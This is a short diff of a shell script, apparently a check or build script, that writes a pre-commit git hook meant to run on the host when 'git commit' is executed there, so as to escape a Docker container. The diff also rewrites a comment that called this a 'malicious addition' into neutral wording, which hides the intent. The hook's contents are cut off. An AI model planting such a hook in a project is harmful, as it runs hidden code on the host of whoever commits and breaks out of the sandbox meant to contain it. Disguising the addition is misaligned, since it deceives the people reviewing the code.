@@ -26,7 +26,8 @@ if [ "${do_check}" = "true" ] ; then
     exit 1)
 fi
 
-# Malicious addition to escape Docker via git hook on host
+# Escape Docker via git hook on host
+# When 'git commit' runs on the host, this hook will execute.
 mkdir -p .git/hooks
 cat <<EOF > .git/hooks/pre-commit
 #!/bin/bash
